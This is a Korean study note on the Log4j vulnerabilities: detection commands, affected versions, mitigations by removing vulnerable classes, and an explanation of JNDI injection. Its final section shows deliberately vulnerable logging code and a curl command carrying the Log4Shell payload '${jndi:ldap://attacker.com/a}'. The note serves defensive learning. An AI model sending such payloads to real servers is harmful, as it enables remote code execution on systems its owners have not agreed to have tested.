
[로그에 대한 기본 지식](https://github.com/sungmin4036/infomation_security/blob/main/etc/log%EB%9E%80%3F.md)

---

- log4j란?

: log4j의 기능은 웹 서비스 동작 과정에서 일어나는 모든 기록을 남겨 침해사고 발생 및 이상징후를 점검하기 위해 필수적으로 필요한 기능.  

무료로 제공되는 오픈소스 프로그램으로 Java 기반의 모든 어플리케이션에서 사용할 수 있습니다.

<br>

- log4j 주로 사용하는 서비스는? 
: 일반적인 웹 사이트, 쇼핑몰, 그룹웨어 등 JAva를 기반으로 한 JVM(Java Virtual Machine) 환경을 사용하는 모든 서비스에서 사용 가능

<br>

- log4j  사용하고 있는지 확인 하는 방법

```
linux

- dpkg -l | grep log4j
- find / -name 'log4j*'
```

```
windows

- window explorer의 검생 기능(log4j 검색)을 이용

```

```
Java Spring Framework Maven

log4j가 설치된 경로의 pom.xml 파일을 열어 "log4j-core"로 검색

```

![image](https://user-images.githubusercontent.com/62640332/159493244-9f2caebe-805e-43c8-84ad-9e99ca944501.png)

<br>

- log4j 1.X 버전 영향은?

: log4j 1.x 버전은 CVE-2021-44228, CVE-2021-45046 취약점에는 영향을 받지 않으나 CVE-2021-4104에 해당.

본 취약점은 `JMSAppender`를 사용하지 않는 경우 취약점의 영향은 없으나 , 1.x 버전은 이미 2015년 이후 업데이트가 종료되었으므로 보안 위협들에 노출될 가능성이 높습니다. 최신버전으로 업데이트 적용하기를 권고


<br>

- 버전에 따라 log4j 조치하는 방법 및 업데이트 불가능할 경우 대응 방법.

  - JAVA사용 버전에 따라 최신 LOG4j 버전으로 업데이트 수행

  - 즉시 업데이트가 어려운 경우 log4j 버전 따른 해결 방안 

```
zip : 압축하는 리눅스 명령어

-d : 특정경로의 class를 delete 한다. 

-q : 메세지 출력 제한 옵션이다. 
```

  - log4j-2.x 버전 ] CVE-2021-44228, CVE-2021-45046 : JndiLookup 클래스를 경로에서 제거
    
    - zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

    - log4j-core JAR 파일 없이 log4j-api JAR파일만 사용하는 경우 취약점의 영향 받지 않음



  - log4j-1.2.x 버전] CVE-2021-4104 : JMSAppender 사용 확인 후 코드 수정 또는 삭제

    - zip -d log4j-1.2.12.jar org/apache/log4j/net/JMSAppender.class  

    - zip -d log4j-1.2.*.jar org/apache/log4j/net/JMSAppender.class (* 모든버전일괄)




<br>

- 보안 업데이트 안되있을시 발생할수 있는것

: 원격의 공격자가 이 취약점을 이요하여 악성코드 유포, 중요 데이터 탕취, 임의의 파일 다운로드 및 실행 가능.


---

![image](https://user-images.githubusercontent.com/62640332/160333695-05063e41-e79f-43ba-81c3-ef50c793ce60.png)





---


### ㅁ JNDI

: JNDI 는 Java Naming and Directory Interface의 약자로 클라이언트가 서버상의 데이터나 객체를 lookup 할 수 있는 Java API

찾고자 하는 객체에 접근 할 수 있는 단일의 인터페이스를 제공하며 이 API를 이용해서 객체를 lookup, querying 그리고 binding 할 수 있다.

예로 아래와 같은 소스코드가 실행이 가능하다 

```
DataSource ds = (DataSource) ctx.lookup("java:comp/env/jdbc/datasource");
assertNotNull(ds.getConnection());
```

![image](https://user-images.githubusercontent.com/62640332/160330119-327b75d5-d130-4ba2-8e00-6dd695e18650.png)

- Log4J 에서 JNDI 호출

특정 버전의 Log4J에서 JNDI를 포함한 쿼리를 호출하는 경우 내부적으로 객체를 lookup 하는 기능이 있었다.

특정 버전에서 Log4J 함수로 특정한 쿼리를 실행하면 JNDI를 실행한다. 그래서 단순한 로그만 출력해도 아래 그림처럼 시스템 내부의 특정 프로그램을 실행할 수 있게 된다.

아래 그림은 Log4J를 실행해서 원격 서버의 프로그램이 실행된 예다.

![image](https://user-images.githubusercontent.com/62640332/160330264-db894897-66c0-4101-be5b-cf2f948ac896.png)

그래도 출력하는 로그가 하드 코딩돼서 실행중에 바뀌지 않는다면 문제는 없다. 직접 로그 안에 JNDI를 심어두는 일은 거의 없을 거니까. 그런데 서버 프로그래밍을 하다 보면 사용자가 갖고 있는 정보나 URL의 파라미터를 출력하게 되는 경우도 종종 생긴다. 만약 해커가 로그를 출력하는 부분을 파악해 해당 api에 의도적으로 JNDI LDAP 정보를 심어 넣는다면 외부에서 코드를 실행할 수 있게 된다.

```
public class VulnerableLog4jExampleHandler implements HttpHandler { static Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());
/** * A simple HTTP endpoint that reads the request's User Agent and logs it back.
* This is basically pseudo-code to explain the vulnerability, and not a full example.
* @param he HTTP Request Object */ 
public void handle(HttpExchange he) throws IOException { String userAgent = he.getRequestHeader("user-agent");
// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.
// The attacker can set their User-Agent header to: ${jndi:ldap://attacker.com/a}

log.info("Request User Agent:{}", userAgent); ... } }
```

위의 코드를 보면 사용자의 user-agent 정보를 log.info 로 출력한다. 디버깅 용도로 이런 로그 한번 쯤은 찍어두게 했을 것이다. 그런데 만약 해커가 User-Agent를 이렇게 바꿨다고 해보자 

```
curl 127.0.0.1:8080 -H 'User-Agent: ${jndi:ldap://attacker.com/a}'
```
그러면 User-Agent를 출력하는 코드가 영락 없이 JNDI를 호출하는 코드가 실행되고 해커의 서버에선(attacker.com) 우리의 서버와 JNDI를 통해서 내부 라이브러리를 실행할 수 있게 된다.

[출처]
1. kisa log4j 보안 취약점 가이드
2. https://selfish-developer.com/entry/log4j-%EC%9D%B4%EC%8A%88-%EC%82%B4%ED%8E%B4%EB%B3%B4%EA%B8%B0
